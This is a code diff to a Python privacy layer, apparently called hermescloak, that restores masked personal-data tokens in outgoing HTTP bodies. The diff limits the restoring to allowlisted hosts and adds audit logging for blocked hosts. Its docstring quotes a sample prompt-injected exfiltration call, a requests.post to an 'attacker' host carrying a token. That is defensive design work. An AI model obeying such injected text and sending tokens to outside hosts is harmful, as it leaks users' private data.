@@ -11,8 +11,10 @@ produced them.
 Design / safety:
   * Wraps `requests.sessions.Session.request`. Acts ONLY when the body actually
     contains the token marker ⟦ (so virtually every request is untouched).
-  * Restoring ⟦tokens⟧ in an outbound body is always safe: a token in an external
-    request is, by definition, leaked internal state that should be real.
+  * ONLY for hosts you list in ``$HERMES_HOME/cloak/egress_hosts`` (one per line; a line
+    ``example.com`` also covers ``*.example.com``). Restoring for any host would turn a
+    prompt-injected ``requests.post("https://attacker", data="⟦לקוח_1⟧…")`` into a leak of
+    real values. No file → nothing is restored (``egress_blocked`` in the audit log).
   * Fail-open: any error → the original request is sent unchanged.
   * Idempotent install(); kill-switch env HERMESCLOAK_EGRESS_OFF=1.
   * Binary `files=` attachments (docx/pdf) are NOT handled here — use the
@@ -36,10 +38,10 @@ def _audit_restored(home, url):
         import time as _t
         from urllib.parse import urlparse
         from hermescloak.egress import _home
-        log = os.path.join(_home(home), "cloak", "audit.log")
-        with open(log, "a", encoding="utf-8") as f:
-            f.write(_j.dumps({"kind": "egress_http_restored", "ts": _t.strftime("%F %T"),
-                              "host": urlparse(url).netloc}, ensure_ascii=False) + "\n")
+        from hermescloak.fsutil import append_private
+        append_private(os.path.join(_home(home), "cloak", "audit.log"),
+                       _j.dumps({"kind": "egress_http_restored", "ts": _t.strftime("%F %T"),
+                                 "host": urlparse(url).hostname or "?"}, ensure_ascii=False) + "\n")
     except Exception:
         pass
 
@@ -68,6 +70,42 @@ def _restore_blob(d, home):
     except Exception:
         pass
     return d, False
+
+
+def _allowed_host(url, home) -> bool:
+    from urllib.parse import urlparse
+    from hermescloak.egress import _home
+    host = (urlparse(url).hostname or "").lower().rstrip(".")
+    try:
+        with open(os.path.join(_home(home), "cloak", "egress_hosts"), encoding="utf-8") as f:
+            allowed = {ln.split("#", 1)[0].strip().lower().rstrip(".") for ln in f}
+    except OSError:
+        return False
+    allowed.discard("")
+    return bool(host) and any(host == a or host.endswith("." + a) for a in allowed)
+
+
+def _audit_blocked(home, url):
+    try:
+        import json as _j
+        import time as _t
+        from urllib.parse import urlparse
+        from hermescloak.egress import _home
+        from hermescloak.fsutil import append_private
+        append_private(os.path.join(_home(home), "cloak", "audit.log"),
+                       _j.dumps({"kind": "egress_blocked", "ts": _t.strftime("%F %T"),
+                                 "host": urlparse(url).hostname or "?"}, ensure_ascii=False) + "\n")
+    except Exception:
+        pass
+
+
+def _has_token(kwargs) -> bool:
+    j, d = kwargs.get("json"), kwargs.get("data")
+    if j is not None and "⟦" in _json.dumps(j, ensure_ascii=False):
+        return True
+    if isinstance(d, (str, bytes)):
+        return True                     # may hide a token in base64: let _restore_blob decide
+    return isinstance(d, dict) and any(isinstance(v, str) and "⟦" in v for v in d.values())
 
 
 def _restore_leaves(obj, home):
@@ -119,7 +157,11 @@ def install(hermes_home: str | None = None) -> bool:
     def request(self, method, url, **kwargs):
         try:
             if (("json" in kwargs and kwargs["json"] is not None) or kwargs.get("data") is not None):
-                if _restore_body(kwargs, home):
+                if not _allowed_host(url, home):
+                    probe = dict(kwargs)
+                    if _has_token(probe) and _restore_body(probe, home):
+                        _audit_blocked(home, url)   # tokens stay tokens for an unlisted host
+                elif _restore_body(kwargs, home):
                     _audit_restored(home, url)   # positive proof the net fired (no PII; host only)
         except Exception:
             pass                       # fail-open: never block a request
